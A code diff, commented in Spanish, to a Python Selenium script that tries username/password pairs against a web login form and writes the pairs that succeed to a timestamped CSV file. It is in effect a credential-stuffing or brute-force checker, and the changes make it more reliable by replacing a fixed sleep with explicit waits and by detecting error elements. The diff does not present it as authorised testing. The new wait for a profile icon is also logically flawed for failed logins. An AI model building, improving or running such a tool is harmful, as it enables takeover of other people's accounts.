@@ -10,7 +10,10 @@ from selenium.common.exceptions import NoSuchElementException, WebDriverExceptio
 from tqdm import tqdm
 from datetime import datetime
 
+
 def iniciar_sesion(usuario, contrasena, credenciales_validas):
+    driver = None  # Inicializar a None para el caso en que ocurra una excepción antes de asignar el controlador
+
     try:
         # Inicializar el navegador Chrome
         driver = webdriver.Chrome()
@@ -36,21 +39,24 @@ def iniciar_sesion(usuario, contrasena, credenciales_validas):
         )
         submit.click()
 
-        # Esperar un tiempo razonable para que la página se cargue completamente
-        time.sleep(5)
+        # Esperar a que la página se cargue completamente después de iniciar sesión
+        WebDriverWait(driver, 20).until(
+            EC.presence_of_element_located((By.CLASS_NAME, 'profile-icon'))
+        )
 
-        # Buscar el mensaje de error en el contenido de la página
-        page_content = driver.page_source
-        if "Contraseña incorrecta." not in page_content:
-            print(f"Las credenciales {usuario}, {contrasena} funcionan correctamente")
+        # Verificar si hay un mensaje de error
+        error_message = driver.find_elements(By.CLASS_NAME, 'ui-message-container.ui-message-error')
+        if error_message:
+            print(f"Las credenciales {usuario}:{contrasena} no funcionan... Intentando con el siguiente conjunto.")
+        else:
+            print(f"Las credenciales {usuario}:{contrasena} funcionan correctamente")
             credenciales_validas.append((usuario, contrasena))
-    except NoSuchElementException:
-        print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
+
     except WebDriverException as e:
         print(f"Hubo un problema al intentar iniciar sesión con {usuario}, {contrasena}")
     except Exception as e:
         # Imprimir el mensaje de error específico si lo hay
-        print(str(e))
+        print(f"Error inesperado: {str(e)}")
     finally:
         # Cerrar el navegador en cualquier caso
         if driver:
@@ -79,7 +85,7 @@ if os.path.isfile(csv_file_path):
 
 # Guardar las credenciales válidas en un archivo .csv
 if credenciales_validas:
-    locale.setlocale(locale.LC_TIME, 'en_ES.UTF-8')
+    locale.setlocale(locale.LC_TIME, 'es_ES.UTF-8')
     now = datetime.now()
     format_date = now.strftime('%d-%b-%Y_%I-%M-%S')  # Formato de fecha en el nombre del archivo
 
